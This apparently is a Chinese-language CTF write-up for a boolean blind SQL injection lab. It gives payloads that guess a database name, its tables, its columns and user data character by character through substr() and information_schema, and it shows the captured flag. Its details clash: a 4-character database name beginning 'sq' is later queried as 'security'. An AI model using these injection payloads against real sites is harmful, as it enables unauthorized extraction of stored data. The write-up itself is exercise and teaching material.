# CTFHUB_bool注入

## 题目内容

![image-20210822205050572](/home/adian/note/Study_Note/网络安全/CTF/pic/17.png)

## WriteUp
此题只给出执行成功还是执行失败

我们首先尝试获取数据库名长度

```
1 and length(database())>=4
```

在4处执行成功，证明数据库名有4位，然后我们使用substr()逐一爆破每一位的字符

```
1 and substr(database(),1,1)='s'
```

第一位为s

```
1 and substr(database(),2,1)='q'
```

第二位为q返回成功

以此类推就可以枚举出来完整的数据库名

**逐位爆表名**

```sql
1 and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e' %23
```

limit为从第0位开始，查询第一位，也就是第一个表名

**逐位爆列名**

```sql
1 and substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='i' %23
```

**爆数据同理**

```sql
1 and substr((select username from security.users where id='1' limit 0,1),1,1)='d' %23
```

这里推荐完全使用自动化工具比如sqlmap，情况特殊可以自己编写脚本进行枚举

```
[1 entry]
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{6681b6c51d232cbbc5aabfa5} |
+----------------------------------+
```

